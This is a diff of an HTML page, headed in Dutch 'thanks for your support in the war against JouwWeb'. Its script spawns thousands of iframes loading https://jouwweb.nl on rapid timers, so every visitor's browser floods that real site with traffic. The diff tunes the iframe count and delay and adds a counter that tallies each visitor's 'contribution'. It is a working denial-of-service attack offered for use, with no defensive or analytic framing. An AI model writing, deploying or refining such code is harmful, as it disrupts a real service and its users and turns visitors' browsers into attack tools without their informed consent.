@@ -13,7 +13,8 @@
             justify-content: center;
             align-items: center;
             overflow: hidden;
-            background-color: #000 ;
+            background-color: #000;
+            position: relative;
         }
 
         .glowing-text {
@@ -40,22 +41,59 @@
             height: 1px;
             border: none;
         }
+
+        .counter {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            color: #fff;
+            font-size: 18px;
+            font-weight: bold;
+            text-align: right;
+        }
+
+        .counter .label {
+            font-size: 16px;
+        }
+
+        @media (max-width: 600px) {
+            .glowing-text {
+                font-size: 18px;
+            }
+
+            .counter {
+                font-size: 14px;
+            }
+        }
     </style>
 </head>
 <body>
 
     <div class="glowing-text">Bedankt voor uw steun in de oorlog tegen JouwWeb</div>
+    
+    <div class="counter">
+        <div class="label">Bijdrage:</div>
+        <span id="iframeCount">0</span>
+    </div>
 
     <script>
+        let iframeCount = 0;
+
+        function updateIframeCount() {
+            document.getElementById('iframeCount').textContent = iframeCount;
+        }
+
         function createIframeWithDelay(index) {
             let iframe = document.createElement('iframe');
             iframe.src = 'https://jouwweb.nl';
             document.body.appendChild(iframe);
+            iframeCount++; // Increment iframe counter
+            updateIframeCount(); // Update the counter display
         }
 
         function createIframesWithDelay() {
-            let delay = 1; // Delay in milliseconds
-            for (let i = 0; i < 1000000; i++) {
+            let delay = 0.1; // Delay in milliseconds
+            for (let i = 0; i < 10000; i++) {
                 setTimeout(() => {
                     createIframeWithDelay(i);
                 }, i * delay);
